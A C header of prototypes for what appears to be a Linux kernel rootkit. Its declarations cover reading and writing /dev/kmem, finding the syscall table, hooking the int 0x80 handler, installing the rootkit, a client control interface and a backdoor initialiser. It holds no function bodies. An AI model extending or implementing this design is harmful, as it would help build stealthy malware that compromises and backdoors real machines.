/*
 * $Id: extern.h, various exported calls
 */

#ifndef EXTERN_H
#define EXTERN_H

/* string.c protos */
#include "skstr.h"

/* kmem.c protos */
extern int	open_kmem(void);
extern int	rkm(int fd, void *buf, int count, ulong off);
extern int	wkm(int fd, void *buf, int count, ulong off);
extern int	rkml(int fd, ulong *l, ulong off);
extern int	wkml(int fd, ulong l, ulong off);

/* pattern.c protos */
extern ulong	get_kma(int kmem, ulong pgoff, ulong *rgfp, ulong hint);
extern ulong	get_sct(int fd, ulong ep, ulong *);

/* client.c protos */
extern int	installed();
extern int	client(int, char **);
extern int	skio(int cmd, sk_io *buf);

/* install.c protos */
extern int	install();

/* kernel.c protos */
extern ulong	old80;
extern void	new80();
extern void	kernel_start();
extern void	kernel_end();
extern void	kernel_init(uchar *mem, ulong *sct, ulong *sctp[2], ulong oldsys);
//extern int	kernel_init(kma_struc *);

/* backdoor.c protos */
extern int	backdoor_init();

#endif
